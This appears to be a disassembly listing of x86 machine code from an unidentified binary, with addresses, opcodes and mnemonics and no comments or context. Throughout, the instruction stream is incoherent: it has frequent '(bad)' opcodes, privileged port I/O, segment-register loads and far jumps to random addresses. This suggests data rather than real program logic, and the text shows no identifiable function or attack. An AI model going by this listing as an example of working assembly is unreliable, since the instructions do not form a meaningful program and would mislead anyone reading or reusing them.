  4040bb:	inc    WORD PTR [ebp-0x2a3122f3]
  4040c2:	mov    bh,0x62
  4040c4:	jne    0x404053
  4040c6:	frstor [ecx+0x73]
  4040c9:	push   ebp
  4040ca:	aaa    
  4040cb:	out    0x47,eax
  4040cd:	xchg   DWORD PTR [si],ecx
  4040d0:	mov    ecx,0x7c684d2a
  4040d5:	paddusw mm5,QWORD PTR [ecx+esi*4-0x4948a94]
  4040dd:	out    0x29,al
  4040df:	(bad)  
  4040e1:	fnstenv ds:0x58008180
  4040e7:	push   0xb6c01c55
  4040ec:	jecxz  0x4040fa
  4040ee:	stos   DWORD PTR es:[edi],eax
  4040ef:	shl    BYTE PTR [eax-0x279a7f22],1
  4040f5:	pop    ds
  4040f6:	mov    esi,0x20cdb8
  4040fb:	push   eax
  4040fc:	jl     0x40411d
  4040fe:	or     eax,0x5df8f72f
  404103:	jnp    0x4040cc
  404105:	stos   DWORD PTR es:[edi],eax
  404106:	mov    ah,0xfb
  404108:	xchg   edi,eax
  404109:	clc    
  40410a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40410b:	mov    edx,esi
  40410d:	jg     0x404117
  40410f:	add    DWORD PTR [esi+0x48c3f5a3],0x4e142db0
  404119:	add    ah,BYTE PTR [esi-0x9bd70fa]
  40411f:	mov    edi,0xafe6d603
  404124:	sub    DWORD PTR [ebp+0x71],esi
  404127:	shl    BYTE PTR [eax-0x3a],cl
  40412a:	mov    ecx,0x8c108b35
  40412f:	or     BYTE PTR [edi+0x17596c5e],0x25
  404136:	sbb    DWORD PTR [eax],0x7e
  404139:	xor    eax,0xf5450f07
  40413e:	or     edi,ebp
  404140:	mov    dl,bh
  404142:	add    eax,0x1159ec8f
  404147:	or     al,0xbb
  404149:	lahf   
  40414a:	jl     0x404194
  40414c:	out    dx,al
  40414d:	jge    0x4040e6
  40414f:	stc    
  404150:	push   ss
  404151:	xchg   edx,eax
  404152:	mov    BYTE PTR [ebp-0x36029da1],bl
  404158:	sbb    BYTE PTR [ecx+0x24],0x41
  40415c:	xor    DWORD PTR [esi+eax*8],ebx
  40415f:	iret   
  404160:	xchg   BYTE PTR [esi-0x191f3313],dl
  404166:	retf   0x981f
  404169:	xlat   BYTE PTR ds:[ebx]
  40416a:	mov    bh,0x1c
  40416c:	adc    al,0x30
  40416e:	push   es
  40416f:	pcmpeqb mm6,QWORD PTR [edx+ecx*4-0x62]
  404174:	fst    QWORD PTR ss:[esi+eax*2-0x17]
  404179:	or     al,0x85
  40417b:	pop    esi
  40417c:	mov    gs,WORD PTR [edx]
  40417e:	(bad)
  404181:	icebp  
  404182:	mov    dl,0x9a
  404184:	aad    0x2a
  404186:	daa    
  404187:	inc    eax
  404188:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40418a:	adc    BYTE PTR [esi],bh
  40418c:	retf   0x3dde
  40418f:	and    eax,0xc1fe4d9e
  404194:	scas   al,BYTE PTR es:[edi]
  404195:	or     eax,0x525bfba9
  40419a:	jns    0x4041ab
  40419c:	lock and al,0xe4
  40419f:	adc    DWORD PTR [edi+0x6b759b1c],edi
  4041a5:	inc    ebp
  4041a6:	adc    ah,ch
  4041a8:	std    
  4041a9:	mov    edx,0x21ea58a2
  4041ae:	leave  
  4041af:	inc    ebx
  4041b0:	lahf   
  4041b1:	cmp    al,0x73
  4041b3:	jmp    0x4041a2
  4041b5:	jmp    0x404193
  4041b7:	sub    ch,bh
  4041b9:	neg    BYTE PTR [ebx-0x4bd163cb]
  4041bf:	mov    ecx,0x68c33c8d
  4041c4:	ss cmp eax,0xf5dc6ede
  4041ca:	in     eax,0xa7
  4041cc:	add    al,0xbc
  4041ce:	rol    DWORD PTR [eax],cl
  4041d0:	pop    edi
  4041d1:	and    BYTE PTR [esp+ebx*8],al
  4041d4:	(bad)  
  4041d5:	mul    DWORD PTR [edi]
  4041d7:	mov    ebp,0xe228b395
  4041dc:	xor    eax,0xb221b7b9
  4041e1:	mov    edx,0x3258a1b9
  4041e6:	pop    esi
  4041e7:	mov    al,ds:0x19f78582
  4041ec:	loope  0x40420a
  4041ee:	or     cl,ch
  4041f0:	and    DWORD PTR [eax],ecx
  4041f2:	xchg   BYTE PTR [ebx+0x10],dh
  4041f5:	xor    eax,0x476cf079
  4041fb:	pop    ecx
  4041fc:	sbb    edi,DWORD PTR [ebx-0x143f460a]
  404202:	iret   
  404203:	repnz mov bh,0xb9
  404206:	pop    ss
  404207:	pushf  
  404208:	xor    DWORD PTR [ebp-0xc],ebx
  40420b:	into   
  40420c:	vpavgb xmm2,xmm4,XMMWORD PTR [edi]
  404210:	stos   DWORD PTR es:[edi],eax
  404211:	jne    0x4041d3
  404213:	add    BYTE PTR [edx-0x667da479],ah
  404219:	cdq    
  40421a:	push   eax
  40421b:	int3   
  40421c:	pop    ds
  40421d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40421e:	inc    edx
  40421f:	repnz aam 0x9b
  404222:	popf   
  404223:	and    esp,DWORD PTR [eax+0x7bef3928]
  404229:	lea    esi,[edi-0x42]
  40422c:	sbb    eax,0x6d615da0
  404231:	nop
  404232:	sbb    al,0x4d
  404234:	mov    esi,0x256fa7ef
  404239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40423a:	xor    BYTE PTR ds:0x2a1205b6,ah
  404240:	xchg   ebx,ebp
  404242:	js     0x404213
  404244:	xlat   BYTE PTR ds:[ebx]
  404245:	pusha  
  404246:	in     al,dx
  404247:	xchg   esp,eax
  404248:	or     al,0xad
  40424a:	cmc    
  40424b:	jl     0x404295
  40424d:	enter  0xf0ec,0x6d
  404251:	mov    ds:0x7e260a76,al
  404256:	xchg   ecx,eax
  404257:	fdivr  DWORD PTR [edi]
  404259:	cmp    eax,0xa8a5061f
  40425e:	cmp    DWORD PTR [eax+0x2d],ebx
  404261:	(bad)  
  404262:	(bad)  
  404263:	out    0x52,al
  404265:	ret    
  404266:	xor    cl,BYTE PTR [edx+0x5adb9be3]
  40426c:	add    BYTE PTR [ecx+0x2faf5af9],cl
  404272:	leave  
  404273:	dec    eax
  404274:	cdq    
  404275:	mov    al,0x75
  404277:	dec    ecx
  404278:	(bad)  
  404279:	cmp    al,BYTE PTR [edx-0x3a66b8ec]
  40427f:	lock add ebp,DWORD PTR [esi-0x59]
  404283:	push   ecx
  404284:	mov    ch,BYTE PTR [esi+0x53]
  404287:	lods   al,BYTE PTR ds:[esi]
  404288:	repnz (bad) 
  40428a:	stos   BYTE PTR es:[edi],al
  40428b:	hlt    
  40428c:	rcl    BYTE PTR [ebx+0x43185d6b],cl
  404292:	push   cs
  404293:	(bad)  
  404294:	mov    ah,0x49
  404296:	cmp    al,0xfc
  404298:	sub    eax,0x458975d3
  40429d:	sar    BYTE PTR ds:0xfb7cb118,0x48
  4042a4:	push   edx
  4042a5:	das    
  4042a6:	iret   
  4042a7:	je     0x4042be
  4042a9:	aad    0xb6
  4042ab:	or     DWORD PTR [esi+0x59ed93a2],ebx
  4042b1:	adc    BYTE PTR ds:0x4d0025c3,dl
  4042b7:	cld    
  4042b8:	es mov edx,0x16bac2c0
  4042be:	pxor   mm4,QWORD PTR [eax]
  4042c1:	call   0x5a3441bf
  4042c6:	inc    esp
  4042c7:	pop    edi
  4042c8:	fwait
  4042c9:	std    
  4042ca:	dec    ebp
  4042cb:	sub    dl,BYTE PTR [edx]
  4042cd:	jmp    FWORD PTR [eax+0x40f0a2dc]
  4042d3:	int3   
  4042d4:	adc    DWORD PTR [esi+eiz*4-0x1ba6771d],esi
  4042db:	mov    al,0xe9
  4042dd:	pop    ds
  4042de:	xor    esp,DWORD PTR [ecx]
  4042e0:	mov    ecx,0x7aadd8c0
  4042e5:	lods   eax,DWORD PTR ds:[esi]
  4042e6:	jmp    0x404270
  4042e8:	mov    ebp,0xc498ca20
  4042ed:	mov    BYTE PTR [edx],dh
  4042ef:	push   esp
  4042f0:	pusha  
  4042f1:	aas    
  4042f2:	in     al,dx
  4042f3:	jge    0x4042e9
  4042f5:	jmp    0xe0a40d9f
  4042fa:	js     0x4042a9
  4042fc:	pusha  
  4042fd:	push   0xfffffff6
  4042ff:	bnd ja 0x404371
  404302:	sbb    cl,BYTE PTR [edi+0x46]
  404305:	data16 outs dx,BYTE PTR ds:[esi]
  404307:	lds    ecx,FWORD PTR [ecx+0x1d10c0b0]
  40430d:	out    0x9a,al
  40430f:	sub    eax,0xa04f3aeb
  404314:	sahf   
  404315:	data16 mov ch,0xcd
  404318:	pop    eax
  404319:	div    DWORD PTR [edx]
  40431b:	dec    eax
  40431c:	xchg   edi,eax
  40431d:	faddp  st(7),st
  40431f:	retf   
  404320:	loope  0x4042c9
  404322:	xor    dl,BYTE PTR [ebp-0x67]
  404325:	cwde   
  404326:	pushf  
  404327:	add    al,0xe7
  404329:	in     al,dx
  40432a:	popf   
  40432b:	xor    cl,BYTE PTR [esi-0x207dd049]
  404331:	push   ebp
  404332:	dec    edi
  404333:	aas    
  404334:	dec    esi
  404335:	stc    
  404336:	and    DWORD PTR [ebp+0xb],ebx
  404339:	dec    esp
  40433a:	cmc    
  40433b:	sub    eax,0x6723bd1
  404340:	dec    ebx
  404341:	ss xchg esp,eax
  404343:	mov    esi,edx
  404345:	add    BYTE PTR [edi+0x57],bh
  404348:	outs   dx,BYTE PTR ds:[esi]
  404349:	xor    eax,0xa2c62004
  40434e:	sahf   
  40434f:	mov    ebx,0x8688cce2
  404354:	fistp  WORD PTR [eax+0x20]
  404357:	into   
  404358:	loope  0x40433b
  40435a:	in     eax,dx
  40435b:	sbb    eax,0x4ceb833d
  404360:	outs   dx,DWORD PTR ds:[esi]
  404361:	jecxz  0x4042e8
  404363:	mov    edx,0xb4f60bb9
  404368:	mov    eax,0x31eed927
  40436d:	or     al,0xdd
  40436f:	xchg   edx,eax
  404370:	or     DWORD PTR [edx*4-0x69486d40],esi
  404377:	adc    cl,BYTE PTR [bx+si]
  40437a:	out    dx,eax
  40437b:	xor    edx,DWORD PTR [ecx+ebp*1+0x414a72d2]
  404382:	sbb    cl,cl
  404384:	xchg   DWORD PTR [ecx],ebp
  404386:	jle    0x4043df
  404388:	popa   
  404389:	cmp    bl,BYTE PTR [edx-0x25]
  40438c:	jle    0x404314
  40438e:	pop    eax
  40438f:	in     al,0xf6
  404391:	out    0x1,al
  404393:	lock rol DWORD PTR [esi],cl
  404396:	or     BYTE PTR [edx],0x89
  404399:	sbb    al,0x3a
  40439b:	xchg   esi,eax
  40439c:	cs leave 
  40439e:	push   ebp
  40439f:	mov    DWORD PTR [ecx],ebp
  4043a1:	cmp    cl,ch
  4043a3:	mov    ds:0x1986e66,al
  4043a8:	xchg   edx,eax
  4043a9:	test   al,0xaa
  4043ab:	mov    ch,ah
  4043ad:	mov    ds:0x88260d26,eax
  4043b2:	mov    eax,ds:0x7d087ca
  4043b7:	int    0x63
  4043b9:	xchg   edx,eax
  4043ba:	ret    
  4043bb:	stos   DWORD PTR es:[edi],eax
  4043bc:	dec    edi
  4043bd:	int    0xc8
  4043bf:	retf   0x2e55
  4043c2:	fnstenv [edi+0x69]
  4043c5:	mov    ecx,0x5ffef9ab
  4043ca:	(bad)  
  4043cb:	neg    bh
  4043cd:	add    esp,esp
  4043cf:	sub    dh,bh
  4043d1:	out    dx,eax
  4043d2:	int3   
  4043d3:	mov    eax,ds:0x8644741b
  4043d8:	test   DWORD PTR ds:0x93e8d9a0,edx
  4043de:	cmp    DWORD PTR [esi+ebp*4],esp
  4043e1:	ss xchg edi,eax
  4043e3:	fidivr WORD PTR [edi+edi*2+0x3189a4b4]
  4043ea:	xchg   edi,eax
  4043eb:	fadd   st,st(6)
  4043ed:	lds    ebp,FWORD PTR [edi]
  4043ef:	dec    DWORD PTR [edx+0x50496e01]
  4043f5:	pusha  
  4043f6:	(bad)  
  4043f7:	sbb    ecx,ebp
  4043f9:	test   eax,0xaa02f58a
  4043fe:	fs push ebp
  404400:	add    al,BYTE PTR [ecx+edx*2]
  404403:	fnstsw WORD PTR [esi]
  404405:	test   BYTE PTR [edi+edx*2],dl
  404408:	jge    0x4043f2
  40440a:	outs   dx,BYTE PTR ds:[esi]
  40440b:	fsubr  st(7),st
  40440d:	mov    ch,al
  40440f:	arpl   WORD PTR [ebx+0x2772e1b],si
  404415:	push   ebp
  404416:	sub    edx,DWORD PTR [esi]
  404418:	mov    edx,0x499afc34
  40441d:	jnp    0x40440e
  40441f:	mov    bh,0x2
  404421:	sbb    DWORD PTR [ebx+0x382e42b5],0x6733980c
  40442b:	xchg   ebp,eax
  40442c:	and    ch,al
  40442e:	and    bl,al
  404430:	stos   BYTE PTR es:[edi],al
  404431:	sub    DWORD PTR ss:[ebp+esi*1+0x33],eax
  404436:	sar    ch,0x4
  404439:	adc    eax,0xc781b672
  40443e:	sub    al,0x77
  404440:	xchg   esp,eax
  404441:	sbb    dl,BYTE PTR [ebx]
  404443:	gs xchg ebp,eax
  404445:	jmp    0x404480
  404447:	pop    esi
  404448:	mov    ch,0x3e
  40444a:	test   al,0x1
  40444c:	cmp    ch,ah
  40444e:	loopne 0x404414
  404450:	pop    ebx
  404451:	mov    eax,0xab1b3f7e
  404456:	aaa    
  404457:	lahf   
  404458:	arpl   bx,dx
  40445a:	push   esp
  40445b:	popf   
  40445c:	cmp    ecx,ebx
  40445e:	imul   esp,DWORD PTR [edx],0x1e
  404461:	div    bh
  404463:	in     eax,dx
  404464:	jp     0x404466
  404466:	scas   eax,DWORD PTR es:[edi]
  404467:	(bad)  
  404468:	cdq    
  404469:	push   esi
  40446a:	fcomp  QWORD PTR ds:0xf04d6b40
  404470:	pop    esp
  404471:	pushf  
  404472:	or     BYTE PTR [eax-0x4717969c],ah
  404478:	mov    ecx,0xdc4e44c0
  40447d:	out    dx,eax
  40447e:	retf   
  40447f:	cmp    al,0xed
  404481:	add    al,0xd
  404483:	mov    esi,0xe695f7a0
  404488:	(bad)  
  404489:	cmp    bh,BYTE PTR [edi]
  40448b:	fnstenv [ebx+0x6a]
  40448e:	pusha  
  40448f:	push   ds
  404490:	mov    ah,0xd8
  404492:	mov    al,cl
  404494:	test   BYTE PTR [eax+0x2],dh
  404497:	xchg   DWORD PTR ds:0xd957134c,eax
  40449d:	sbb    eax,0x975c04d
  4044a2:	inc    edi
  4044a3:	mov    dl,0xd2
  4044a5:	jmp    0x404488
  4044a7:	sbb    edi,DWORD PTR [ebp+0x3e09e48a]
  4044ad:	mov    BYTE PTR [edx+0x6c],bh
  4044b0:	and    bh,dl
  4044b2:	add    bh,BYTE PTR ds:0x2d2d59b7
  4044b8:	mov    esi,0xe83b1573
  4044bd:	ja     0x404444
  4044bf:	dec    eax
  4044c0:	sbb    dl,bh
  4044c2:	scas   al,BYTE PTR es:[edi]
  4044c3:	jns    0x4044d7
  4044c5:	je     0x404543
  4044c7:	push   0xffffff81
  4044c9:	cwde   
  4044ca:	mov    eax,0x7de75c74
  4044cf:	gs ins BYTE PTR es:[edi],dx
  4044d1:	shr    bl,1
  4044d3:	in     eax,dx
  4044d4:	test   bl,0xf4
  4044d7:	aad    0x3b
  4044d9:	pop    ebx
  4044da:	inc    edi
  4044db:	add    eax,0x5055d7a2
  4044e0:	mov    ebp,DWORD PTR [esi+0x58]
  4044e3:	mul    DWORD PTR [ebx-0x16095f1]
  4044e9:	mov    al,0x6e
  4044eb:	sub    edi,edi
  4044ed:	daa    
  4044ee:	cld    
  4044ef:	push   0x36
  4044f1:	(bad)  
  4044f2:	sub    DWORD PTR [edx],edx
  4044f4:	sub    BYTE PTR [ebp-0x706e1ca1],ch
  4044fa:	mov    eax,0xa3107e26
  4044ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404500:	shl    DWORD PTR [esi+0x4fe6e8b1],cl
  404506:	adc    bl,BYTE PTR [eax+0x569898bb]
  40450c:	int    0x32
  40450e:	push   es
  40450f:	cmp    ebp,DWORD PTR [esi-0x6b]
  404512:	leave  
  404513:	sbb    al,0x96
  404515:	mov    esi,0x72f88e3
  40451a:	scas   eax,DWORD PTR es:[edi]
  40451b:	cmp    ecx,esi
  40451d:	rcl    BYTE PTR [edi-0x5eeaa7e5],cl
  404523:	pop    eax
  404524:	mov    ds:0x6d515521,eax
  404529:	push   edi
  40452a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452b:	and    dh,dl
  40452d:	in     al,dx
  40452e:	repz int 0x15
  404531:	cld    
  404532:	inc    ecx
  404533:	and    al,0xa7
  404535:	mov    eax,ds:0xa281ca20
  40453a:	push   es
  40453b:	ret    0x580e
  40453e:	call   0x5240fe79
  404543:	jmp    0x54c5dc15
  404548:	jns    0x40457b
  40454a:	shr    BYTE PTR [ecx+0x39],0x78
  40454e:	clc    
  40454f:	or     DWORD PTR [ebx-0x5d],edx
  404552:	bound  esp,QWORD PTR [ebp+0x56]
  404555:	sub    DWORD PTR [edx+0x74],0x1278e3ea
  40455c:	shl    DWORD PTR ds:0x32b483be,1
  404562:	ins    BYTE PTR es:[edi],dx
  404563:	xchg   ebx,eax
  404564:	fsubr  st(7),st
  404566:	je     0x4045b8
  404568:	jb     0x4045e8
  40456a:	data16 sub BYTE PTR [eax+0x0],bh
  40456e:	iret   
  40456f:	enter  0xd6f2,0x4a
  404573:	add    DWORD PTR [eax+0x6e6f647d],ebx
  404579:	retf   
  40457a:	fs ret 0x1d5b
  40457e:	cs retf 0xb594
  404582:	repnz sbb esi,ecx
  404585:	out    dx,eax
  404586:	or     ebx,edx
  404588:	jb     0x404535
  40458a:	push   ecx
  40458b:	jmp    0x5a23c9fe
  404590:	ss jbe 0x4045bc
  404593:	neg    BYTE PTR [edi+edx*2-0x279e7eb2]
  40459a:	int3   
  40459b:	arpl   WORD PTR ds:[ebx-0x42a7ada1],ax
  4045a2:	aaa    
  4045a3:	fiadd  DWORD PTR [edx+0x768b8ada]
  4045a9:	jle    0x404588
  4045ab:	sahf   
  4045ac:	lds    esp,FWORD PTR [ecx]
  4045ae:	daa    
  4045af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b0:	outs   dx,DWORD PTR ds:[esi]
  4045b1:	cs push 0x68
  4045b4:	or     al,0xfe
  4045b6:	dec    eax
  4045b7:	push   ds
  4045b8:	sbb    BYTE PTR [ebx],al
  4045ba:	test   eax,0x8c006897
  4045bf:	ret    
  4045c0:	sbb    al,0xe2
  4045c2:	jle    0x40462d
  4045c4:	into   
  4045c5:	sti    
  4045c6:	xchg   esp,eax
  4045c7:	and    eax,0x3c50e8c4
  4045cc:	stos   BYTE PTR es:[edi],al
  4045cd:	add    edx,0xffffffdf
  4045d0:	cmp    eax,0x3684e21c
  4045d5:	shl    BYTE PTR [ebx+eiz*4+0x73],cl
  4045d9:	pop    esi
  4045da:	and    dh,BYTE PTR [edi-0x2d]
  4045dd:	pop    es
  4045de:	sar    al,cl
  4045e0:	or     eax,0x9786329e
  4045e5:	test   eax,0x495bd717
  4045ea:	push   edi
  4045eb:	add    ecx,0xffffffd4
  4045ee:	xchg   ebp,eax
  4045ef:	popf   
  4045f0:	iret   
  4045f1:	mov    ebp,0x2229268d
  4045f6:	mov    dl,0x50
  4045f8:	in     eax,0xc8
  4045fa:	int    0x65
  4045fc:	retf   0xe966
  4045ff:	clc    
  404600:	xchg   edi,eax
  404601:	stc    
  404602:	inc    ebx
  404603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404604:	xor    ch,dl
  404606:	and    eax,DWORD PTR [esi]
  404608:	enter  0x96ff,0xc9
  40460c:	aam    0xc5
  40460e:	ss pop ss
  404610:	pop    es
  404611:	pop    ecx
  404612:	jecxz  0x40467b
  404614:	inc    ebx
  404615:	nop
  404616:	xchg   edi,eax
  404617:	pop    ds
  404618:	xchg   BYTE PTR [ecx-0x2c],ah
  40461b:	cdq    
  40461c:	shr    BYTE PTR [eax+0x599f1eca],1
  404622:	xor    DWORD PTR [esi-0x72d9bc89],0xb253008a
  40462c:	push   ss
  40462d:	jae    0x4045c7
  40462f:	aam    0xf0
  404631:	pop    ds
  404632:	es inc edi
  404634:	xor    eax,0xcb9c727c
  404639:	lods   al,BYTE PTR ds:[esi]
  40463a:	sub    al,0x9d
  40463c:	repnz cld 
  40463e:	or     eax,DWORD PTR [eax-0x546d7c5a]
  404644:	xlat   BYTE PTR ds:[ebx]
  404645:	mov    ebx,0x10c9dcf2
  40464a:	data16 cld 
  40464c:	mov    al,ch
  40464e:	jge    0x4046b7
  404650:	fdiv   DWORD PTR [edx+ecx*2-0x714d87c]
  404657:	add    eax,0xe3a8af5
  40465c:	mov    al,ds:0x2dee0772
  404661:	jno    0x404613
  404663:	sbb    DWORD PTR [ebx-0x19fef834],ebx
  404669:	sti    
  40466a:	repnz mov ch,0x3b
  40466d:	mov    edi,0x6c5494da
  404672:	je     0x4046dc
  404674:	ret    0xdd5c
  404677:	retf   
  404678:	xor    al,bh
  40467a:	mov    cl,BYTE PTR [ecx-0x3f0c5754]
  404680:	inc    ecx
  404681:	mov    cs,WORD PTR [ebp+0x4]
  404684:	pop    ss
  404685:	xor    al,0xc9
  404687:	pop    ss
  404688:	inc    edx
  404689:	jmp    0xc2c4:0x2ff14498
  404690:	clc    
  404691:	cmp    eax,DWORD PTR ss:[edx+eax*4+0x67]
  404696:	pop    ss
  404697:	mov    dh,0x5f
  404699:	and    al,0x8d
  40469b:	inc    ebx
  40469c:	in     al,0x61
  40469e:	sahf   
  40469f:	jne    0x40468b
  4046a1:	jne    0x404656
  4046a3:	pop    eax
  4046a4:	cmp    al,0xec
  4046a6:	ficom  WORD PTR [edx-0x51]
  4046a9:	call   0x123e:0xf364ade4
  4046b0:	add    bl,BYTE PTR [ebx+0x6651728e]
  4046b6:	fistp  QWORD PTR [edx-0x64275598]
  4046bc:	cmp    al,0x65
  4046be:	mov    dl,BYTE PTR [esp+edi*1-0x6]
  4046c2:	test   DWORD PTR [ebx+ebp*2],edi
  4046c5:	cmp    al,0x96
  4046c7:	gs mov dl,0xcf
  4046ca:	into   
  4046cb:	outs   dx,BYTE PTR ds:[esi]
  4046cc:	cmp    al,0xfc
  4046ce:	retf   0x526b
  4046d1:	sar    BYTE PTR [edx+0x222bb407],cl
  4046d7:	inc    edx
  4046d8:	mov    ecx,0xafce2144
  4046dd:	jb     0x4046b6
  4046df:	adc    al,BYTE PTR [eax-0x41]
  4046e2:	popaw  
  4046e4:	aas    
  4046e5:	int3   
  4046e6:	loopne 0x4046ff
  4046e8:	pop    es
  4046e9:	mov    eax,0x3661c993
  4046ee:	and    BYTE PTR [esi+0x294e1e29],al
  4046f4:	pop    edx
  4046f5:	sub    ebp,ebx
  4046f7:	fdivrp st(6),st
  4046f9:	or     esi,DWORD PTR [esi]
  4046fb:	lds    ebp,FWORD PTR [edx-0x5b]
  4046fe:	aam    0x10
  404700:	pop    ss
  404701:	sub    BYTE PTR [eax+ebp*4+0x19677962],bl
  404708:	aam    0x26
  40470a:	push   ebx
  40470b:	pop    ebp
  40470c:	mov    DWORD PTR ds:0xd9cc3bab,ecx
  404712:	cmc    
  404713:	sbb    eax,0x31f5da05
  404718:	jmp    0xf6a9ad42
  40471d:	lahf   
  40471e:	sahf   
  40471f:	inc    esi
  404720:	shl    BYTE PTR [edi-0x65],0x2b
  404724:	ret    
  404725:	or     al,0x10
  404727:	jmp    0x6bca:0x23f35124
  40472e:	or     ecx,DWORD PTR [ecx]
  404730:	mov    dl,0x61
  404732:	test   cl,dl
  404734:	pop    esi
  404735:	add    al,0xc7
  404737:	mov    dh,0x4e
  404739:	fwait
  40473a:	dec    edi
  40473b:	mov    al,0xcc
  40473d:	sub    BYTE PTR [ecx-0x45],0xea
  404741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404742:	es inc ebp
  404744:	ss js  0x404717
  404747:	inc    esp
  404748:	push   cs
  404749:	imul   edx,ebx,0x72
  40474c:	push   ecx
  40474d:	jecxz  0x4046d4
  40474f:	into   
  404750:	xchg   ecx,eax
  404751:	jmp    FWORD PTR [ebx-0x535c4c66]
  404757:	jo     0x404773
  404759:	data16 shr BYTE PTR [edx],0x6b
  40475d:	lock scas eax,DWORD PTR es:[edi]
  40475f:	out    0x9f,eax
  404761:	test   eax,0x5bd237d4
  404766:	xor    esp,0x2db17232
  40476c:	imul   DWORD PTR [ecx]
  40476e:	jge    0x404747
  404770:	add    bh,BYTE PTR [ebx]
  404772:	jmp    DWORD PTR [edi-0x7334d91f]
  404778:	es loopne 0x4047e2
  40477b:	arpl   WORD PTR [esi-0x2d],dx
  40477e:	jo     0x40473c
  404780:	jmp    0x40471c
  404782:	jb     0x404753
  404784:	sub    al,0xeb
  404786:	mov    ch,0xf
  404788:	add    al,0xfd
  40478a:	das    
  40478b:	rcl    DWORD PTR [ecx+0x12b4882],0x3a
  404792:	in     eax,dx
  404793:	ss sbb eax,0x6ba69d2
  404799:	xchg   edx,eax
  40479a:	enter  0x8c46,0x8
  40479e:	and    DWORD PTR [eax-0x320b05d7],esp
  4047a4:	pop    ss
  4047a5:	sti    
  4047a6:	hlt    
  4047a7:	popf   
  4047a8:	popa   
  4047a9:	jo     0x404818
  4047ab:	data16 fldl2e 
  4047ae:	loope  0x4047d8
  4047b0:	jbe    0x4047f1
  4047b2:	mov    edi,0x94c62a8f
  4047b7:	sub    eax,0xae94757b
  4047bc:	push   0xb312cf29
  4047c1:	std    
  4047c2:	mov    edx,DWORD PTR [edi+eax*8+0x7d]
  4047c6:	loope  0x4047b3
  4047c8:	sti    
  4047c9:	push   ds
  4047ca:	or     eax,0x865553f1
  4047cf:	mov    ds:0x8f5c3e57,eax
  4047d4:	shr    DWORD PTR [edx-0x2],0x9a
  4047d8:	fistp  DWORD PTR [esi-0x64]
  4047db:	neg    BYTE PTR [eax+0x22]
  4047de:	pushf  
  4047df:	call   0xa8d3:0x2564ab7b
  4047e6:	neg    BYTE PTR [esi+esi*8-0x7a]
  4047ea:	mov    ch,0x71
  4047ec:	adc    BYTE PTR [eax],al
  4047ee:	inc    ebx
  4047ef:	test   BYTE PTR [edx+0x38],cl
  4047f2:	inc    eax
  4047f3:	jne    0x4047aa
  4047f5:	pushf  
  4047f6:	mov    edx,0x64a51211
  4047fb:	enter  0x7189,0x9a
  4047ff:	mov    dl,al
  404801:	xchg   DWORD PTR [esi],eax
  404803:	push   ss
  404804:	xchg   ebx,eax
  404805:	ret    0x2c3c
  404808:	(bad)  
  404809:	stos   DWORD PTR es:[edi],eax
  40480a:	test   DWORD PTR [ebx-0x5cfc76f0],ebp
  404810:	add    DWORD PTR [ecx+0x4d],eax
  404813:	add    esi,DWORD PTR [edi]
  404815:	call   0xdccc:0x44d12be0
  40481c:	ins    BYTE PTR es:[edi],dx
  40481d:	sti    
  40481e:	fidivr WORD PTR ds:0xa0ecabb2
  404824:	xor    BYTE PTR [ebx+0x38fb6883],al
  40482a:	in     eax,0x38
  40482c:	js     0x4047d3
  40482e:	adc    eax,0x202808ca
  404833:	stos   DWORD PTR es:[edi],eax
  404834:	mov    dl,0x31
  404836:	sahf   
  404837:	fbstp  TBYTE PTR [edx-0x51]
  40483a:	push   edx
  40483b:	jmp    0x9c9e7d84
  404840:	push   es
  404841:	pop    edi
  404842:	mov    dl,0x4e
  404844:	imul   ebx,esp,0x26
  404847:	sub    al,0x22
  404849:	adc    dh,ch
  40484b:	jl     0x4047e0
  40484d:	dec    edi
  40484e:	(bad)  
  40484f:	and    al,0xe8
  404851:	sub    esp,DWORD PTR [edi-0x2]
  404854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404855:	ds shl dl,cl
  404858:	dec    ebp
  404859:	mov    esi,0xff0fb5e0
  40485e:	sbb    al,BYTE PTR [edx]
  404860:	push   edi
  404861:	retf   
  404862:	and    al,0x54
  404864:	rol    DWORD PTR [edi-0x1e],1
  404867:	shl    BYTE PTR [edx+0x6b2e4bbb],1
  40486d:	sbb    BYTE PTR [eax+edi*8-0x74],ah
  404871:	idiv   bh
  404873:	in     al,dx
  404874:	sbb    eax,0xfbc3fc23
  404879:	(bad)  
  40487b:	pavgw  mm1,mm5
  40487e:	popa   
  40487f:	enter  0x12e9,0xbb
  404883:	cwde   
  404884:	rol    BYTE PTR [ebp-0x2d],1
  404887:	add    esp,DWORD PTR [esi-0xd]
  40488a:	out    0xc9,al
  40488c:	aas    
  40488d:	adc    BYTE PTR [edx-0x5a89412a],bl
  404893:	popa   
  404894:	add    esi,edi
  404896:	aam    0xe
  404898:	fwait
  404899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40489a:	xchg   ebx,eax
  40489b:	icebp  
  40489c:	xchg   edx,eax
  40489d:	in     eax,0x4e
  40489f:	xchg   esi,eax
  4048a0:	mov    ah,bl
  4048a2:	mov    ds:0x160e5091,eax
  4048a7:	gs and eax,0x7c0200d6
  4048ad:	push   0x5852880f
  4048b2:	mov    dh,0x78
  4048b4:	(bad)  
  4048b5:	sbb    al,0x40
  4048b7:	shr    DWORD PTR [edx+0x5a96dea4],1
  4048bd:	lods   eax,DWORD PTR ds:[esi]
  4048be:	add    BYTE PTR [ebp+0x3f0c5c97],bl
  4048c4:	push   ebx
  4048c5:	mov    ah,0xb0
  4048c7:	mov    ds:0x43b3ad1c,al
  4048cc:	into   
  4048cd:	cmp    DWORD PTR [esp],ebx
  4048d0:	(bad)  
  4048d1:	sbb    esi,0x3bd19574
  4048d7:	lods   al,BYTE PTR ds:[esi]
  4048d8:	push   edx
  4048d9:	aad    0xdc
  4048db:	xchg   ebx,eax
  4048dc:	enter  0x8ba5,0x88
  4048e0:	push   esi
  4048e1:	call   0xceed:0x69d24248
  4048e8:	add    dh,BYTE PTR [esi+0x673023bb]
  4048ee:	push   ecx
